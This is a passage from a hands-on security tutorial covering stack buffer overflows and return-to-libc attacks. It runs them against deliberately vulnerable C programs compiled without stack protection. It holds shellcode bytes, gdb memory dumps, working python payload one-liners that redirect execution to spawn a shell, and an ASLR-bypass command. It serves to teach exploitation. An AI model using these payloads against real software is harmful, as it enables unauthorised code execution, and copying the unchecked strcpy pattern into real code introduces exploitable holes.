    <p>An introduction to exploit2 is provided at [2]. They way things work in a simple way is, <code>exploit2</code> launches pushes the content of <code>buff</code> to an environmental variable called <code>EGG</code> and just afterwards, launches a shell with this environmental variable active. Within the shell, we launch <code>vulnerable</code> and use <code>$EGG</code> as a parameter. The trick here is that when constructing <code>buff</code> in <code>exploit2</code>, we obtain the stack pointer (<code>esp</code> in i386) of that binary and substract an arbitrary number we define from it to obtain the address that will be written after the shellcode. This way, we end up with something like this <em>in the heap</em> (note that <code>buff</code> lives in the <em>heap</em>):</p>
    <pre><code>                              /----------------------\  lower
                                  |        shellcode     |  memory
                                  |                      |  addresses
                                  |----------------------|
                                  |                      |
                                | | esp - arbitrary num. |
                        growth  | |                      |
                      direction v |-.-.-.-.-.-.-.-.-.-.-.|
                                  |                      |
                                  | esp - arbitrary num. |
                                  |                      |
                                  |-.-.-.-.-.-.-.-.-.-.-.|
                                  |                      |
                                  | esp - arbitrary num. |
                                  |                      |
                                  |-.-.-.-.-.-.-.-.-.-.-.|
                                            ...</code></pre>
    <p>As pointed out, this content gets pushed to the environmental variable <code>EGG</code>.</p>
    <p>Now, when we launch a shell and subsequently, launch <code>vulnerable</code> within the shell our stack is growing as follows:</p>
    <pre><code>                              /------------------\  higher
                                  |                  |  memory
                                  |                  |  addresses
                                  |------------------|
                                  |                  |
                                | |  Stack exploit2  | esp = 0xffffd740
                        growth  | |                  |
                      direction v |-.-.-.-.-.-.-.-.-.|
                                  |                  |
                                  |    Stack bash    | esp = 0xffffd5a8
                                  |                  |
                                  |-.-.-.-.-.-.-.-.-.|
                                  |                  |
                                  | Stack vulnerable | esp = 0xffffd0c0
                                  |                  |
                                  |-.-.-.-.-.-.-.-.-.|
                                  |                  |
                                  |       ...        |
                                  |                  |                                                            
                                  |------------------|</code></pre>
    <p><em>Note: These numbers will only appear when running each binary with GDB. If not, the stack pointer of <code>exploit2</code> will appear with weird values like <code>0xffde5688</code> and so on.</em></p>
    <p>What this tells us is that making some simple math <code>0xffffd740 - 0xffffd0c0 = 1664</code> we can figure out the offset address needed. In other words, if we substract <code>1664</code> to the <code>esp</code> value of <code>exploit2</code>, we could point to the bits of the <code>vulnerable</code>’s stack pointer and pretty much do with it what we want if we overflow the buffer <code>buffer</code> of <code>vulnerable</code>.</p>
    <p><em>Note: for some reason, the number needed to get the right address in the stack is not 1664 but 8 bits less: 1656. Not sure why.</em></p>
    <p>We can double check this by printing the memory of <code>buff</code> and <code>buffer</code> while debugging <code>exploit2</code> and <code>vulnerable</code> respectively:</p>
    <pre><code>pwndbg&gt; p buff
    $1 = 0x804b008 &quot;EGG=\353\037^\211v\b1\300\210F\a&quot;...
    pwndbg&gt; x/100wx 0x0804b008
    0x804b008:  0x3d474745  0x895e1feb  0xc0310876  0x89074688
    0x804b018:  0x0bb00c46  0x4e8df389  0x0c568d08  0xdb3180cd
    0x804b028:  0xcd40d889  0xffdce880  0x622fffff  0x732f6e69
    0x804b038:  0xffffd068  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b048:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b058:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b068:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b078:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b088:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b098:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b0a8:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b0b8:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b0c8:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b0d8:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b0e8:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b0f8:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b108:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b118:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b128:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b138:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b148:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b158:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b168:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b178:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0x804b188:  0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0</code></pre>
    <pre><code>pwndbg&gt; p argv[1]
    $3 = 0xffffd493 &quot;\353\037^\211v\b1\300\210F\a\211F\f\260&quot;..
    pwndbg&gt; x/100wx 0xffffd493
    0xffffd493: 0x895e1feb  0xc0310876  0x89074688  0x0bb00c46
    0xffffd4a3: 0x4e8df389  0x0c568d08  0xdb3180cd  0xcd40d889
    0xffffd4b3: 0xffdce880  0x622fffff  0x732f6e69  0xffffd068
    0xffffd4c3: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd4d3: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd4e3: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd4f3: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd503: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd513: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd523: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd533: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd543: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd553: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd563: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd573: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd583: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd593: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd5a3: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd5b3: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd5c3: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd5d3: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd5e3: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd5f3: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd603: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    0xffffd613: 0xffffd0c0  0xffffd0c0  0xffffd0c0  0xffffd0c0
    </code></pre>
    <p><em>Note: the first 4 bits of the dump in <code>exploit2</code> don’t match because correspond with the string “EGG=”</em></p>
    <p>Note that <code>0xffffd0c0</code> is appended after the shellcode which aims to overwrite the return address of <code>vulnerable</code> to jump into the beginning of the stack pointer <code>esp</code> which is where the overflowed buffer begins which the malici</p>
    <p>Before the following instructions in <code>vulnerable</code>:</p>
    <div class="sourceCode" id="cb181"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb181-1"><a href="#cb181-1" aria-hidden="true" tabindex="-1"></a><span class="dv">5</span>     strcpy<span class="op">(</span>buffer<span class="op">,</span>argv<span class="op">[</span><span class="dv">1</span><span class="op">]);</span></span></code></pre></div>
    <p>the content of <code>buffer</code> should be:</p>
    <pre><code>pwndbg&gt; p &amp;buffer
    $2 = (char (*)[512]) 0xffffd0c0
    pwndbg&gt; x/100wx 0xffffd0c0 # similar to &quot;x/100wx &amp;buffer&quot;
    0xffffd0c0: 0x00000070  0xf7feff96  0xf7fe933d  0xf7fe1f60
    0xffffd0d0: 0xf7fd8241  0xf7f6d298  0xf7ffd53c  0xf7fe4017
    0xffffd0e0: 0xf7ffc000  0x00001000  0x00000001  0x03ae75f6
    0xffffd0f0: 0xf7ffdad0  0xf7fd5780  0xf7fe1e39  0xf7fd8128
    0xffffd100: 0x00000007  0xf7ffdc08  0x6e43a318  0xf7fe263d
    0xffffd110: 0x00000000  0x00000000  0xf7fd81a0  0x00000007
    0xffffd120: 0xf7fd81c0  0xf7ffdc08  0xffffd17c  0xffffd178
    0xffffd130: 0x00000001  0x00000000  0xf7ffd000  0xf7f6d2a2
    0xffffd140: 0x6e43a318  0xf7fe1f60  0xf7e252e5  0x0804825e
    0xffffd150: 0xf7fd81a0  0x03721d18  0xf7ff5ac4  0xffffd208
    0xffffd160: 0xf7ff39f3  0x0d696910  0xf7ffd000  0x00000000
    0xffffd170: 0xf7fe1e39  0xf7e15d14  0x000008ea  0xf7fd51b0
    0xffffd180: 0xf63d4e2e  0xf7fe263d  0x00000001  0x00000001
    0xffffd190: 0xf7e1edc8  0x000008ea  0xf7e1f618  0xf7fd51b0
    0xffffd1a0: 0xffffd1f4  0xffffd1f0  0x00000003  0x00000000
    0xffffd1b0: 0xf7ffd000  0x0804823d  0xf63d4e2e  0xf7e15f12
    0xffffd1c0: 0x000008ea  0xf7e1f618  0xf7e1edc8  0x07b1ea71
    0xffffd1d0: 0xf7ff5ac4  0xffffd280  0xf7ff39f3  0xf7fd5470
    0xffffd1e0: 0x00000000  0x00000000  0xf7ffd000  0xf7ffdc08
    0xffffd1f0: 0x00000000  0x00000000  0x00000000  0xffffd28c
    0xffffd200: 0xf7fe1fc9  0x00000000  0xf7ffdad0  0xffffd288
    0xffffd210: 0xffffd2d0  0xf7fe2b4b  0x080481fc  0xffffd288
    0xffffd220: 0xf7ffda74  0x00000001  0xf7fd54a0  0x00000001
    0xffffd230: 0x00000000  0x00000001  0xf7ffd918  0x00f0b5ff
    0xffffd240: 0xffffd27e  0x00000001  0x000000c2  0xf7ea26bb</code></pre>
    <p>stepping through this instruction, the content of <code>buffer</code> becomes:</p>
    <pre><code>pwndbg&gt; p &amp;buffer
    $2 = (char (*)[512]) 0xffffd0c0
    0xffffd0c0: 0x00000070  0xf7feff96  0xf7fe933d  0xf7fe1f60
    0xffffd0d0: 0xf7fd8241  0xf7f6d298  0xf7ffd53c  0xf7fe4017
    0xffffd0e0: 0xf7ffc000  0x00001000  0x00000001  0x03ae75f6
    0xffffd0f0: 0xf7ffdad0  0xf7fd5780  0xf7fe1e39  0xf7fd8128
    0xffffd100: 0x00000007  0xf7ffdc08  0x6e43a318  0xf7fe263d
    0xffffd110: 0x00000000  0x00000000  0xf7fd81a0  0x00000007
    0xffffd120: 0xf7fd81c0  0xf7ffdc08  0xffffd17c  0xffffd178
    0xffffd130: 0x00000001  0x00000000  0xf7ffd000  0xf7f6d2a2
    0xffffd140: 0x6e43a318  0xf7fe1f60  0xf7e252e5  0x0804825e
    0xffffd150: 0xf7fd81a0  0x03721d18  0xf7ff5ac4  0xffffd208
    0xffffd160: 0xf7ff39f3  0x0d696910  0xf7ffd000  0x00000000
    0xffffd170: 0xf7fe1e39  0xf7e15d14  0x000008ea  0xf7fd51b0
    0xffffd180: 0xf63d4e2e  0xf7fe263d  0x00000001  0x00000001
    0xffffd190: 0xf7e1edc8  0x000008ea  0xf7e1f618  0xf7fd51b0
    0xffffd1a0: 0xffffd1f4  0xffffd1f0  0x00000003  0x00000000
    0xffffd1b0: 0xf7ffd000  0x0804823d  0xf63d4e2e  0xf7e15f12
    0xffffd1c0: 0x000008ea  0xf7e1f618  0xf7e1edc8  0x07b1ea71
    0xffffd1d0: 0xf7ff5ac4  0xffffd280  0xf7ff39f3  0xf7fd5470
    0xffffd1e0: 0x00000000  0x00000000  0xf7ffd000  0xf7ffdc08
    0xffffd1f0: 0x00000000  0x00000000  0x00000000  0xffffd28c
    0xffffd200: 0xf7fe1fc9  0x00000000  0xf7ffdad0  0xffffd288
    0xffffd210: 0xffffd2d0  0xf7fe2b4b  0x080481fc  0xffffd288
    0xffffd220: 0xf7ffda74  0x00000001  0xf7fd54a0  0x00000001
    0xffffd230: 0x00000000  0x00000001  0xf7ffd918  0x00f0b5ff
    0xffffd240: 0xffffd27e  0x00000001  0x000000c2  0xf7ea26bb</code></pre>
    <p>which seems unchanged. Something’s not quite working. <strong>Follow from here</strong>.</p>
    <p>Let’s launch <code>exploit2</code>:</p>
    <div class="sourceCode" id="cb184"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb184-1"><a href="#cb184-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Terminal 1</span></span>
    <span id="cb184-2"><a href="#cb184-2" aria-hidden="true" tabindex="-1"></a><span class="ex">./exploit2</span> 600 1564</span>
    <span id="cb184-3"><a href="#cb184-3" aria-hidden="true" tabindex="-1"></a><span class="fu">gdb</span> <span class="at">--args</span> ./vulnerable <span class="va">$EGG</span></span></code></pre></div>
    <h3 id="resources-11">Resources</h3>
    <ul>
    <li>[1] A. One (1996). Smashing the Stack for Fun and Profit. Phrack, 7. Retrieved from http://insecure.org/stf/smashstack.html.</li>
    <li>[2] Basic stack overflow experimentation. Retrieved from https://github.com/vmayoral/cybersecurity_specialization/tree/master/software_security/week1.</li>
    </ul>
    <h2 id="return-to-libc">Return to <code>libc</code></h2>
    <p>According to [4], a “return-to-libc” attack is a computer security attack usually starting with a buffer overflow in which a subroutine return address on a call stack is replaced by an address of a subroutine that is already present in the process’ executable memory, bypassing the NX bit feature (if present) and ridding the attacker of the need to inject their own code.</p>
    <hr />
    <p><strong>Note</strong>: as in previous tutorials, there’s a docker container that facilitates reproducing the work of this tutorial. The container can be built with:</p>
    <div class="sourceCode" id="cb185"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb185-1"><a href="#cb185-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-t</span> basic_cybersecurity4:latest .</span></code></pre></div>
    <p>and runned with:</p>
    <div class="sourceCode" id="cb186"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb186-1"><a href="#cb186-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">--privileged</span> <span class="at">-it</span> basic_cybersecurity4:latest</span></code></pre></div>
    <hr />
    <h3 id="finding-a-vulnerability-a-simple-overflow">Finding a vulnerability, a simple overflow</h3>
    <p>We’ll be using the following program named <code>rlibc1.c</code>:</p>
    <div class="sourceCode" id="cb187"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb187-1"><a href="#cb187-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> not_called<span class="op">()</span> <span class="op">{</span></span>
    <span id="cb187-2"><a href="#cb187-2" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;Enjoy your shell!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
    <span id="cb187-3"><a href="#cb187-3" aria-hidden="true" tabindex="-1"></a>    system<span class="op">(</span><span class="st">&quot;/bin/bash&quot;</span><span class="op">);</span></span>
    <span id="cb187-4"><a href="#cb187-4" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb187-5"><a href="#cb187-5" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb187-6"><a href="#cb187-6" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> vulnerable_function<span class="op">(</span><span class="dt">char</span><span class="op">*</span> string<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb187-7"><a href="#cb187-7" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> buffer<span class="op">[</span><span class="dv">100</span><span class="op">];</span></span>
    <span id="cb187-8"><a href="#cb187-8" aria-hidden="true" tabindex="-1"></a>    strcpy<span class="op">(</span>buffer<span class="op">,</span> string<span class="op">);</span></span>
    <span id="cb187-9"><a href="#cb187-9" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb187-10"><a href="#cb187-10" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb187-11"><a href="#cb187-11" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span><span class="op">**</span> argv<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb187-12"><a href="#cb187-12" aria-hidden="true" tabindex="-1"></a>    vulnerable_function<span class="op">(</span>argv<span class="op">[</span><span class="dv">1</span><span class="op">]);</span></span>
    <span id="cb187-13"><a href="#cb187-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb187-14"><a href="#cb187-14" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <p>Let’s a get a bit more of information about the program structure in memory: (<em>compiled with <code>-fno-stack-protector -z execstack</code> flags</em>)</p>
    <pre><code>&gt;&gt;&gt; disas vulnerable_function
    Dump of assembler code for function vulnerable_function:
       0x0804849d &lt;+0&gt;: push   %ebp
       0x0804849e &lt;+1&gt;: mov    %esp,%ebp
       0x080484a0 &lt;+3&gt;: sub    $0x88,%esp
       0x080484a6 &lt;+9&gt;: mov    0x8(%ebp),%eax
       0x080484a9 &lt;+12&gt;:    mov    %eax,0x4(%esp)
       0x080484ad &lt;+16&gt;:    lea    -0x6c(%ebp),%eax
       0x080484b0 &lt;+19&gt;:    mov    %eax,(%esp)
       0x080484b3 &lt;+22&gt;:    call   0x8048330 &lt;strcpy@plt&gt;
       0x080484b8 &lt;+27&gt;:    leave  
       0x080484b9 &lt;+28&gt;:    ret    
    End of assembler dump.
    &gt;&gt;&gt; p not_called
    $1 = {void ()} 0x804847d &lt;not_called&gt;
    &gt;&gt;&gt;</code></pre>
    <p>right before the call to <code>strcpy@plt</code>, the stack and registers looks like:</p>
    <pre><code>─── Memory ───────────────────────────────────────────────────────────────────────────────
                address buffer  address string
    0xffffd750 [6c d7 ff ff] [ba d9 ff ff] 01 00 00 00 38 d9 ff f7 l...........8...
                                                    buffer
    0xffffd760 00 00 00 00 00 00 00 00 00 00 00 00 [00 00 00 00 ................
    0xffffd770 03 00 00 00 09 00 00 00 3f 00 c0 03 00 00 00 00 .... ...?.......
    0xffffd780 34 d8 ff ff a8 d7 ff ff a0 d7 ff ff 69 82 04 08 4...........i...
    0xffffd790 38 d9 ff f7 00 00 00 00 c2 00 00 00 56 ad eb f7 8...........V...
    0xffffd7a0 ff ff ff ff ce d7 ff ff 34 0c e3 f7 f3 72 e5 f7 ........4 ...r..
    0xffffd7b0 00 00 00 00 00 00 c3 00 01 00 00 00 fd 82 04 08 ................
    0xffffd7c0 a2 d9 ff ff 2f 00 00 00 00 a0 04 08 32 85 04 08] ..../.......2...
                                        ebp           ret
    0xffffd7d0 02 00 00 00 94 d8 ff ff [f8 d7 ff ff] [d3 84 04 08] ................
                string
    0xffffd7e0 [ba d9 ff ff] 00 d0 ff f7 eb 84 04 08 00 10 fd f7 ................
    0xffffd7f0 e0 84 04 08 00 00 00 00 00 00 00 00 f3 da e3 f7 ................
    0xffffd800 02 00 00 00 94 d8 ff ff a0 d8 ff ff 6a ae fe f7 ............j...
    0xffffd810 02 00 00 00 94 d8 ff ff 34 d8 ff ff 1c a0 04 08 ........4.......
    0xffffd820 3c 82 04 08 00 10 fd f7 00 00 00 00 00 00 00 00 &lt;...............
    0xffffd830 00 00 00 00 cd fd 26 9d dd 99 23 a5 00 00 00 00 ......&amp;...#.....
    0xffffd840 00 00 00 00 00 00 00 00 02 00 00 00 80 83 04 08 ................
    ─── Registers ────────────────────────────────────────────────────────────────────────────
       eax 0xffffd76c        ecx 0xa52399dd        edx 0xffffd824        ebx 0xf7fd1000    
       esp 0xffffd74c        ebp 0xffffd7d8        esi 0x00000000        edi 0x00000000    
       eip 0x08048330     eflags [ PF SF IF ]       cs 0x00000023         ss 0x0000002b    
        ds 0x0000002b         es 0x0000002b         fs 0x00000000         gs 0x00000063    </code></pre>
    <p>A different representation of the stack available at [3] is:</p>
    <pre><code>higher  | &lt;arguments2&gt;        |
    address | &lt;return address&gt;    |
            | &lt;old %ebp&gt;          | &lt;= %ebp
            | &lt;0x6c bytes of      |
            |       ...           |
            |       buffer&gt;       |
            | &lt;arguments1&gt;        |
    lower   | &lt;address of buffer&gt; | &lt;= %esp</code></pre>
    <p>Note that the starting of the stack has get filled with the parameters for the call to <code>strcpy</code> (<code>arguments2</code>).</p>
    <p>Launching <code>./rlibc1_noprotection "$(python -c 'print "A"*0x6c + "BBBB" + "\x7d\x84\x04\x08"')"</code> we obtain:</p>
    <div class="sourceCode" id="cb191"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb191-1"><a href="#cb191-1" aria-hidden="true" tabindex="-1"></a><span class="ex">Enjoy</span> your shell!</span>
    <span id="cb191-2"><a href="#cb191-2" aria-hidden="true" tabindex="-1"></a><span class="ex">root@44522cd9481b:~#</span></span></code></pre></div>
    <p>Of course, this is with the stack protection disabled, when compiling the program without disabling this protections, the program just crashes and we can’t perform the buffer overflow.</p>
    <div class="sourceCode" id="cb192"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb192-1"><a href="#cb192-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@3bf52dad8e1d:~#</span> ./rlibc1 <span class="st">&quot;</span><span class="va">$(</span><span class="ex">python</span> <span class="at">-c</span> <span class="st">&#39;print &quot;A&quot;*0x6c + &quot;BBBB&quot; + &quot;\x7d\x84\x04\x08&quot;&#39;</span><span class="va">)</span><span class="st">&quot;</span></span>
    <span id="cb192-2"><a href="#cb192-2" aria-hidden="true" tabindex="-1"></a><span class="ex">***</span> stack smashing detected <span class="pp">***</span>: ./rlibc1 terminated</span>
    <span id="cb192-3"><a href="#cb192-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Aborted</span></span></code></pre></div>
    <h3 id="playing-with-arguments">Playing with arguments</h3>
    <p>Let’s play with a slightly different program named <code>rlibc2.c</code>:</p>
    <div class="sourceCode" id="cb193"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb193-1"><a href="#cb193-1" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span><span class="op">*</span> not_used <span class="op">=</span> <span class="st">&quot;/bin/sh&quot;</span><span class="op">;</span></span>
    <span id="cb193-2"><a href="#cb193-2" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb193-3"><a href="#cb193-3" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> not_called<span class="op">()</span> <span class="op">{</span></span>
    <span id="cb193-4"><a href="#cb193-4" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;Not quite a shell...</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
    <span id="cb193-5"><a href="#cb193-5" aria-hidden="true" tabindex="-1"></a>    system<span class="op">(</span><span class="st">&quot;/bin/date&quot;</span><span class="op">);</span></span>
    <span id="cb193-6"><a href="#cb193-6" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb193-7"><a href="#cb193-7" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb193-8"><a href="#cb193-8" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> vulnerable_function<span class="op">(</span><span class="dt">char</span><span class="op">*</span> string<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb193-9"><a href="#cb193-9" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> buffer<span class="op">[</span><span class="dv">100</span><span class="op">];</span></span>
    <span id="cb193-10"><a href="#cb193-10" aria-hidden="true" tabindex="-1"></a>    strcpy<span class="op">(</span>buffer<span class="op">,</span> string<span class="op">);</span></span>
    <span id="cb193-11"><a href="#cb193-11" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb193-12"><a href="#cb193-12" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb193-13"><a href="#cb193-13" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span><span class="op">**</span> argv<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb193-14"><a href="#cb193-14" aria-hidden="true" tabindex="-1"></a>    vulnerable_function<span class="op">(</span>argv<span class="op">[</span><span class="dv">1</span><span class="op">]);</span></span>
    <span id="cb193-15"><a href="#cb193-15" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb193-16"><a href="#cb193-16" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <p>We debug the program to obtain information about the <code>system</code> call and the <code>not_used</code> variable:</p>
    <pre><code>&gt;&gt;&gt; disassemble not_called
    Dump of assembler code for function not_called:
       0x0804847d &lt;+0&gt;: push   %ebp
       0x0804847e &lt;+1&gt;: mov    %esp,%ebp
       0x08048480 &lt;+3&gt;: sub    $0x18,%esp
       0x08048483 &lt;+6&gt;: movl   $0x8048578,(%esp)
       0x0804848a &lt;+13&gt;:    call   0x8048340 &lt;puts@plt&gt;
       0x0804848f &lt;+18&gt;:    movl   $0x804858d,(%esp)
       0x08048496 &lt;+25&gt;:    call   0x8048350 &lt;system@plt&gt;
       0x0804849b &lt;+30&gt;:    leave  
       0x0804849c &lt;+31&gt;:    ret    
    End of assembler dump.
    &gt;&gt;&gt; p not_used
    $5 = 0x8048570 &quot;/bin/sh&quot;</code></pre>
    <p>The idea behind the exploit is to overflow the buffer with the <code>strcpy</code> call and modify the return address to point to the <code>system</code> call address with apprlibcriate parameters (not the default ones which will call <code>/bin/date</code>). The stack should look like:</p>
    <pre><code>| 0x8048570 &lt;not_used&gt;             |
    | 0x43434343 &lt;fake return address&gt; |
    | 0x8048350 &lt;address of system&gt;    |
    | 0x42424242 &lt;fake old %ebp&gt;       |
    | 0x41414141 ...                   |
    |   ... (0x6c bytes of &#39;A&#39;s)       |
    |   ... 0x41414141                 |</code></pre>
    <div class="sourceCode" id="cb196"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb196-1"><a href="#cb196-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@3bf52dad8e1d:~#</span> ./rlibc2_noprotection <span class="st">&quot;</span><span class="va">$(</span><span class="ex">python</span> <span class="at">-c</span> <span class="st">&#39;print &quot;A&quot;*0x6c + &quot;BBBB&quot; + &quot;\x50\x83\x04\x08&quot; + &quot;CCCC&quot; + &quot;\x70\x85\x04\x08&quot;&#39;</span><span class="va">)</span><span class="st">&quot;</span></span>
    <span id="cb196-2"><a href="#cb196-2" aria-hidden="true" tabindex="-1"></a><span class="co">#</span></span></code></pre></div>
    <p>(<em>note, while debugging and playing with the overflow, the following command allows to exit normally <code>gdb --args ./rlibc2_noprotection "$(python -c 'print "A"*0x6c + "\x78\xd7\xff\xff" + "\x50\x83\x04\x08" + "\xd3\x84\x04\x08" + "\x70\x85\x04\x08"')"</code>.</em>)</p>
    <h3 id="return-to-libc-attack">Return to <code>libc</code> attack</h3>
    <p>From [3], the trick is to realize that programs that use functions from a shared library, like <code>printf</code> from <code>libc</code>, will link the entire library into their address space at run time. This means that even if they never call system, the code for system (and every other function in <code>libc</code>) is accessible at runtime. We can see this fairly easy in gdb:</p>
    <pre><code>&gt;&gt;&gt; p system
    $1 = {&lt;text variable, no debug info&gt;} 0x555be310 &lt;__libc_system&gt;
    &gt;&gt;&gt; find 0x555be310, +99999999, &quot;/bin/sh&quot;
    0x556e0d4c
    warning: Unable to access 16000 bytes of target memory at 0x5572ef54, halting search.
    1 pattern found.</code></pre>
    <p>Now from gdb:</p>
    <pre><code>gdb --args rlibc2_noprotection &quot;$(python -c &#39;print &quot;A&quot;*0x6c + &quot;BBBB&quot; + &quot;\x10\xe3\x5b\x55&quot; + &quot;CCCC&quot; + &quot;\x4c\x0d\x6e\x55&quot;&#39;)&quot;</code></pre>
    <p>we’ll get a shell. This however does not happen when launched directly from the command line due to ASLR [5]. To bypass this:</p>
    <pre><code>ulimit -s unlimited # from[3], disable library randomization on 32-bit programs
    ./rlibc2_noprotection &quot;$(python -c &#39;print &quot;A&quot;*0x6c + &quot;BBBB&quot; + &quot;\x10\xe3\x5b\x55&quot; + &quot;CCCC&quot; + &quot;\x4c\x0d\x6e\x55&quot;&#39;)&quot;</code></pre>
    <h3 id="resources-12">Resources</h3>
    <ul>
    <li>[1] M. Hicks (2014), <em>Software Security</em>, Coursera, Cybersecurity Specialization, University of Maryland, College Park, <a href="https://www.coursera.org/learn/software-security" class="uri">https://www.coursera.org/learn/software-security</a>.</li>
    <li>[2] Hovav Shacham (2007), <em>The geometry of innocent flesh on the bone: return-into-libc without function calls (on the x86)</em>. In Proceedings of the 14th ACM conference on Computer and communications security (CCS ’07). ACM, New York, NY, USA, 552-561. DOI: https://doi.org/10.1145/1315245.1315313</li>
    <li>[3] Alex Reece (2013). <em>Introduction to return oriented programming (ROP)</em>. Retrieved from http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html.</li>
    <li>[4] Wikipedia. <em>Return-to-libc attack</em>. Retrieved from https://en.wikipedia.org/wiki/Return-to-libc_attack.</li>
    <li>[5] Wikipedia. <em>Address space layout randomization</em>. Retrieved from https://en.wikipedia.org/wiki/Address_space_layout_randomization.</li>
    </ul>
    <h2 id="return-oriented-programming-rop">Return-Oriented Programming (ROP)</h2>
